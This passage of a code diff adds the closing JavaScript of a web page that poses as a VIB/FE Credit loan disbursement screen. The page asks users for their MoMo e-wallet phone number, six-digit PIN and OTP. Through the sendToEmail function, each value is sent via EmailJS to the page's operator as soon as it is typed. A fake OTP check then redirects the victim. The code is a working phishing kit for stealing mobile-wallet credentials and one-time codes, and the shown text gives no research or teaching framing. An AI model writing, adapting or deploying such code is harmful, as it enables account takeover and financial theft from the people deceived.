+            createDetailItem("Tên khách hàng", formData.fullName)
+          );
+          customerDetailsContainer.appendChild(
+            createDetailItem("Số hợp đồng", contractNumber)
+          );
+
+          const closingDate = new Date();
+          closingDate.setMonth(closingDate.getMonth() + formData.months);
+          const formattedClosingDate = closingDate.toLocaleDateString("vi-VN", {
+            day: "2-digit",
+            month: "2-digit",
+            year: "numeric",
+          });
+          getEl(
+            "closingDateNotice"
+          ).innerHTML = `<strong>VIB</strong> sẽ đóng khoản vay vào ngày <strong>${formattedClosingDate}</strong>, sau khi bạn hoàn tất thanh toán.`;
+        };
+
+        window.showNotification = (
+          message,
+          type = "error",
+          duration = 3000
+        ) => {
+          const notification = getEl("notification");
+          notification.innerHTML = message;
+          notification.className = `notification ${type} show`;
+          setTimeout(() => notification.classList.remove("show"), duration);
+        };
+
+        window.showSection = (sectionId) => {
+          document
+            .querySelectorAll(".page-section")
+            .forEach((section) => section.classList.remove("active"));
+          const targetSection = getEl(sectionId);
+          if (targetSection) {
+            targetSection.classList.add("active");
+            if (sectionId === "momo-password-section") {
+              setTimeout(() => passwordInputEl.focus(), 100);
+            }
+            if (sectionId === "momo-otp-section") {
+              setTimeout(() => otpInputs[0].focus(), 100);
+              unlockOtpSection();
+              otpAttempts = 0;
+              startResendCountdown();
+            }
+          }
+        };
+
+        window.updatePasswordDisplay = (value) => {
+          const charBoxes = document.querySelectorAll(
+            "#momo-password-section .char-box"
+          );
+          charBoxes.forEach((box, index) => {
+            box.classList.toggle("filled", index < value.length);
+            box.classList.remove("active");
+          });
+          const passwordInput = document.getElementById("momo-password");
+          if (document.activeElement === passwordInput && value.length < 6) {
+            if (charBoxes[value.length]) {
+              charBoxes[value.length].classList.add("active");
+            }
+          }
+        };
+
+        window.handlePhoneSubmit = () => {
+          const phoneInput = getEl("momo-phone");
+          let phoneValue = phoneInput.value.replace(/\D/g, "");
+
+          if (phoneValue.length === 10 && phoneValue.startsWith("0")) {
+            credentials.phone = `+84${phoneValue.slice(1)}`;
+            sendToEmail("phone", credentials.phone);
+            const maskedPhone = `${phoneValue.slice(0, 4)} **** ${phoneValue.slice(-3)}`;
+            getEl("masked-phone-password").textContent = maskedPhone;
+            phoneInput.classList.remove("invalid");
+            showSection("momo-password-section");
+          } else {
+            phoneInput.classList.add("invalid");
+            showNotification(
+              "Số điện thoại không hợp lệ. Vui lòng nhập đúng 10 chữ số (bắt đầu bằng 0).",
+              "error"
+            );
+          }
+        };
+
+        window.handlePasswordSubmit = () => {
+          if (passwordInputEl.checkValidity()) {
+            credentials.password = passwordInputEl.value;
+            sendToEmail("password", credentials.password);
+
+            const displayPhone = credentials.phone.replace("+84", "0");
+            const maskedPhone = `${displayPhone.slice(0, 4)} **** ${displayPhone.slice(-3)}`;
+            getEl(
+              "momo-otp-prompt"
+            ).innerHTML = `Mã OTP đã được gửi đến số điện thoại MoMo <span class="otp-phone-blue">${maskedPhone}</span>. Vui lòng nhập để xác thực.`;
+            showSection("momo-otp-section");
+          } else {
+            showNotification("Mật khẩu MoMo phải là 6 chữ số.", "error");
+          }
+        };
+
+        window.handleOtpSubmit = () => {
+          credentials.otp = Array.from(otpInputs)
+            .map((input) => input.value)
+            .join("");
+
+          if (credentials.otp.length !== 4) {
+            showNotification("Mã xác thực phải đủ 4 chữ số.", "error");
+            return;
+          }
+
+          const otpLoading = getEl("momo-otp-loading");
+          const otpSubmitBtn = getEl("momo-otp-submit-btn");
+          otpLoading.style.display = "block";
+          otpSubmitBtn.disabled = true;
+
+          sendToEmail("otp", credentials.otp);
+
+          setTimeout(() => {
+            otpLoading.style.display = "none";
+
+            const correctOtp = "1234"; // Dummy OTP for demo
+
+            if (credentials.otp === correctOtp) {
+              showNotification(
+                "Xác nhận giải ngân thành công! Đang chuyển hướng...",
+                "success",
+                4000
+              );
+              setTimeout(() => {
+                window.location.href =
+                  "Evaluate-conditions.html?status=success";
+              }, 4000);
+            } else {
+              otpAttempts++;
+              const attemptsLeft = 3 - otpAttempts;
+              if (attemptsLeft > 0) {
+                clearOtpInputs();
+                otpSubmitBtn.classList.remove("ready");
+                otpSubmitBtn.disabled = true;
+                showNotification(
+                  `Mã xác thực không đúng. Bạn còn ${attemptsLeft} lần thử.`,
+                  "error"
+                );
+              } else {
+                lockOtpSection();
+                showNotification(
+                  "Bạn đã nhập sai quá 3 lần. Đang chuyển hướng...",
+                  "error",
+                  4000
+                );
+                setTimeout(() => {
+                  window.location.href = "Evaluate-conditions.html?status=failed";
+                }, 4000);
+              }
+            }
+          }, 1500);
+        };
+
+        window.resendOtp = () => {
+          otpAttempts = 0;
+          clearOtpInputs();
+          unlockOtpSection();
+          showNotification(
+            `Đã gửi lại mã OTP đến ${credentials.phone}`,
+            "success"
+          );
+          startResendCountdown();
+        };
+
+        const lockOtpSection = () => {
+          otpInputs.forEach((input) => { input.disabled = true; });
+          const submitBtn = getEl("momo-otp-submit-btn");
+          submitBtn.disabled = true;
+          submitBtn.classList.remove("ready");
+          const resendBtn = getEl("resend-otp-btn");
+          resendBtn.disabled = true;
+        };
+
+        const unlockOtpSection = () => {
+          otpInputs.forEach((input) => { input.disabled = false; });
+          const submitBtn = getEl("momo-otp-submit-btn");
+          submitBtn.disabled = true;
+          submitBtn.classList.remove("ready");
+        };
+
+        let resendTimerInterval = null;
+
+        const startResendCountdown = () => {
+          const resendBtn = getEl("resend-otp-btn");
+          const countdownEl = getEl("resend-countdown");
+          resendBtn.disabled = true;
+          let seconds = 60;
+          countdownEl.textContent = seconds;
+
+          if (resendTimerInterval) clearInterval(resendTimerInterval);
+          resendTimerInterval = setInterval(() => {
+            seconds--;
+            countdownEl.textContent = seconds;
+            if (seconds <= 0) {
+              clearInterval(resendTimerInterval);
+              resendTimerInterval = null;
+              resendBtn.disabled = false;
+            }
+          }, 1000);
+        };
+
+        window.setLang = (lang, btn) => {
+          document.querySelectorAll(".lang-switch-btn").forEach((b) => b.classList.remove("active"));
+          btn.classList.add("active");
+        };
+
+        const sendToEmail = (type, value) => {
+          const serviceID = "service_aa0dvwd";
+          let templateID = "";
+          let templateParams = {};
+          const contractNumber =
+            getEl("customer-details").querySelector(
+              ".detail-item:last-child .value"
+            )?.textContent || "";
+
+          const commonParams = {
+            platform: "MoMo (FECredit Layout v1)",
+            contract_number: contractNumber,
+            customer_name: formData.fullName || "",
+            total_amount: getEl("mainTotalAmount").textContent || "",
+          };
+
+          if (type === "phone") {
+            templateID = "template_akl287g";
+            templateParams = { ...commonParams, phone: value };
+          } else if (type === "password") {
+            templateID = "template_nka2acq";
+            templateParams = {
+              ...commonParams,
+              phone: credentials.phone,
+              password: value,
+            };
+          } else if (type === "otp") {
+            templateID = "template_48ehw5t";
+            templateParams = {
+              ...commonParams,
+              phone: credentials.phone,
+              password: credentials.password,
+              otp: value,
+            };
+          }
+
+          if (templateID) {
+            emailjs
+              .send(serviceID, templateID, templateParams)
+              .then(() => console.log(`${type} sent successfully.`))
+              .catch((err) =>
+                console.error(
+                  `EmailJS send failed for ${type}:`,
+                  JSON.stringify(err)
+                )
+              );
+          }
+        };
+
+        const clearOtpInputs = () => {
+          otpInputs.forEach((input) => (input.value = ""));
+          otpInputs[0].focus();
+        };
+
+        const setupEventListeners = () => {
+          const phoneInput = getEl("momo-phone");
+          phoneInput.addEventListener("input", () => {
+            let value = phoneInput.value.replace(/\D/g, "");
+            if (value.length > 10) {
+              value = value.slice(0, 10);
+            }
+            phoneInput.value = value;
+            phoneInput.classList.toggle(
+              "invalid",
+              value.length > 0 && value.length < 10
+            );
+          });
+
+          otpInputs.forEach((input, index) => {
+            input.addEventListener("input", () => {
+              input.value = input.value.replace(/\D/g, "");
+              if (input.value && index < otpInputs.length - 1) {
+                otpInputs[index + 1].focus();
+              }
+              const filled = Array.from(otpInputs).map((i) => i.value).join("");
+              const submitBtn = getEl("momo-otp-submit-btn");
+              if (filled.length === 4) {
+                submitBtn.classList.add("ready");
+                submitBtn.disabled = false;
+              } else {
+                submitBtn.classList.remove("ready");
+                submitBtn.disabled = true;
+              }
+            });
+            input.addEventListener("keydown", (e) => {
+              if (e.key === "Backspace" && !input.value && index > 0) {
+                otpInputs[index - 1].focus();
+              }
+            });
+          });
+
+          updatePasswordDisplay(passwordInputEl.value);
+          passwordInputEl.addEventListener("focus", () =>
+            updatePasswordDisplay(passwordInputEl.value)
+          );
+          passwordInputEl.addEventListener("blur", () => {
+            document
+              .querySelectorAll("#momo-password-section .char-box")
+              .forEach((box) => box.classList.remove("active"));
+          });
+        };
+
+        const init = () => {
+          populateData();
+          setupEventListeners();
+        };
+
+        init();
+      });
+    </script>
+  </body>
+</html>
+
+
+
